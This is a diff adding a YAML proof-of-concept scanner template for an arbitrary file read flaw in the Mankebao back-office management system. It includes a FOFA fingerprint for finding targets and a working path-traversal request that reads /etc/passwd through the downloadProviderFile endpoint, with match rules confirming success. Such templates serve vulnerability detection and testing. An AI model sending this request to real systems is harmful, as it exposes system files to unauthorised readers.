@@ -1,0 +1,16 @@
+id: poc-yaml-mankebao-bms-downloadproviderfile-anyfile-read
+info:
+  name: 满客宝后台管理系统 downloadProviderFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 满客宝后台管理系统
+  fofa: body="满客宝后台管理系统"
+requests:
+- method: GET
+  path: /warehouse/api/v1/provider/downloadProviderFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(headers,\"attachment;filename=\") &&\ncontains(content_type,\"\
+    application/doc\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
